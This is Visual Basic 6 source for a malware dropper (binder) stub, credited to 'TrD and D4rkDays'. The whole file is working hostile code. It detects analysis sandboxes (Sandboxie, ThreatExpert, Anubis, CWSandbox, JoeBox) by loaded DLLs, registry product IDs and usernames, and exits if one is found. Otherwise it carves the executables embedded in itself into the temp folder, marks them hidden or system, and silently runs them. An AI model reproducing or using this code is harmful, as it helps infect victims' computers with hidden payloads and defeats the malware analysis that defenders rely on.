VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   3090
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   4680
   LinkTopic       =   "Form1"
   ScaleHeight     =   3090
   ScaleWidth      =   4680
   StartUpPosition =   3  'Windows Default
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Const HELLO_MOTHERFUCKS = "This is by TrD and D4rkDays so bow to us biatch"
Private Const PROCESS_ALL_ACCESS = &H1F0FFF
Option Explicit
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Private Declare Function CreateToolhelp32Snapshot Lib "kernel32" (ByVal dwFlags As Long, ByVal th32ProcessID As Long) As Long
Private Declare Function Module32First Lib "kernel32" (ByVal hSnapShot As Long, lppe As MODULEENTRY32) As Long
Private Declare Function Module32Next Lib "kernel32" (ByVal hSnapShot As Long, lppe As MODULEENTRY32) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long
Private Declare Function RegOpenKeyEx Lib "advapi32" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, ByRef phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "advapi32" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, ByRef lpType As Long, ByVal lpData As String, ByRef lpcbData As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32" (ByVal hKey As Long) As Long
Private Type MODULEENTRY32
    dwSize As Long
    th32ModuleID As Long
    th32ProcessID As Long
    GlblcntUsage As Long
    ProccntUsage As Long
    modBaseAddr As Byte
    modBaseSize As Long
    hModule As Long
    szModule As String * 256
    szExePath As String * 1024
End Type
Const HKEY_LOCAL_MACHINE = &H80000002
Const REG_SZ = 1&
Const KEY_ALL_ACCESS = &H3F
Const TH32CS_SNAPMODULE = &H8
Const FILE_ATTRIBUTE_READONLY = &H1
Const FILE_ATTRIBUTE_HIDDEN = &H2
Const FILE_ATTRIBUTE_SYSTEM = &H4
Const FILE_ATTRIBUTE_DIRECTORY = &H10
Const FILE_ATTRIBUTE_ARCHIVE = &H20
Const FILE_ATTRIBUTE_NORMAL = &H80
Const FILE_ATTRIBUTE_TEMPORARY = &H100
Const FILE_ATTRIBUTE_COMPRESSED = &H800
Const SetSplit = "||||"
Private Declare Function SetFileAttributes Lib "kernel32" Alias "SetFileAttributesA" (ByVal lpFileSpec As String, ByVal dwFileAttributes As Long) As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Public AutoStartup As String
Public ExtractName As String
Public Reg As Object

Private Sub Form_Load()
Dim TimeSettings As String
Dim ParamSettings As String
Dim AttribSettings As String
Dim SetAttribSettings As String
Dim File As String
Dim FileSettings As String
Dim Drop() As String
Dim Ex As String
Dim Temp() As String
Dim strTime As String
Dim ExecutionStyle As String
Dim i As Integer
If IsInSandbox = True Then
Exit Sub
End If
If Norman = True Then
Exit Sub
End If
If IsFGVS = True Then
Exit Sub
End If
Open App.Path & "\" & App.EXEName & ".exe" For Binary As #1
File = Space(LOF(1))
Get #1, , File
Close #1
Drop() = Split(File, "\/\/")
For i = 1 To UBound(Drop()) - 1
Open Environ("tmp") & "\test" & i & ".exe" For Binary As #1
Put #1, , Drop(i)
Close #1
Open Environ("tmp") & "\test" & i & ".exe" For Binary As #1
FileSettings = Space(LOF(1))
Get #1, , FileSettings
Close #1
Ex = Split(FileSettings, SetSplit)(1)
strTime = Split(FileSettings, SetSplit)(2)
TimeSettings = Split(FileSettings, SetSplit)(3)
ParamSettings = Split(FileSettings, SetSplit)(4)
AttribSettings = Split(FileSettings, SetSplit)(5)
ExtractName = Split(FileSettings, SetSplit)(6)
ExecutionStyle = Split(FileSettings, SetSplit)(7)
If FileExists(Environ("tmp") & "\" & ExtractName) = True Then
Kill Environ("tmp") & "\" & ExtractName
Name Environ("tmp") & "\test" & i & ".exe" As Environ("tmp") & "\" & ExtractName
Else
Name Environ("tmp") & "\test" & i & ".exe" As Environ("tmp") & "\" & ExtractName
End If
Select Case (AttribSettings)
    Case "Normal":
        SetAttribSettings = FILE_ATTRIBUTE_NORMAL
    Case "Hidden":
        SetAttribSettings = FILE_ATTRIBUTE_HIDDEN
    Case "Read Only":
        SetAttribSettings = FILE_ATTRIBUTE_READONLY
    Case "Temp":
        SetAttribSettings = FILE_ATTRIBUTE_TEMPORARY
    Case "System":
        SetAttribSettings = FILE_ATTRIBUTE_SYSTEM
    Case "Compressed":
        SetAttribSettings = FILE_ATTRIBUTE_COMPRESSED
    End Select
    SetFileAttributes Environ("tmp") & "\" & ExtractName, SetAttribSettings
Select Case Ex
    Case "True":
        If strTime = "True" Then
        Call Sleep(TimeSettings)
        End If
       Call ShellExecute(0, vbNullString, Environ("tmp") & "\" & ExtractName, " " & ParamSettings, vbNullString, ExecutionStyle)
   Case "False":
     GoTo NextFile
End Select
NextFile:
Next i
End
End Sub

Public Function IsInSandbox() As Boolean
Dim hKey As Long, hOpen As Long, hQuery As Long, hSnapShot As Long
Dim me32 As MODULEENTRY32
Dim szBuffer As String * 128
hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId)
me32.dwSize = Len(me32)
Module32First hSnapShot, me32
Do While Module32Next(hSnapShot, me32) <> 0
    If InStr(1, LCase(me32.szModule), "sbiedll.dll") > 0 Then 'Sandboxie
        IsInSandbox = True
    ElseIf InStr(1, LCase(me32.szModule), "dbghelp.dll") > 0 Then 'ThreatExpert
        IsInSandbox = True
    End If
Loop
CloseHandle (hSnapShot)
If IsInSandbox = False Then
    hOpen = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, hKey)
    If hOpen = 0 Then
        hQuery = RegQueryValueEx(hKey, "ProductId", 0, REG_SZ, szBuffer, 128)
        If hQuery = 0 Then
            If InStr(1, szBuffer, "76487-337-8429955-22614") > 0 Then 'Anubis
                IsInSandbox = True
            ElseIf InStr(1, szBuffer, "76487-644-3177037-23510") > 0 Then 'CWSandbox
                IsInSandbox = True
            ElseIf InStr(1, szBuffer, "55274-640-2673064-23950") > 0 Then 'JoeBox
                IsInSandbox = True
            End If
        End If
    End If
    RegCloseKey (hKey)
End If
End Function

Public Function FileExists(Fname As String) As Boolean
If Fname = "" Or Right(Fname, 1) = "\" Then
FileExists = False: Exit Function
End If
FileExists = (Dir(Fname) <> "")
End Function

Function IsFGVS() As Boolean
If UCase(Left(Environ("USERNAME"), 18)) = "SYNTHETICUSER.FGVS" Then IsFGVS = True
End Function

Function Norman() As Boolean
If UCase(Left(Environ("USERNAME"), 18)) = "CurrentUser" Then Norman = True
End Function

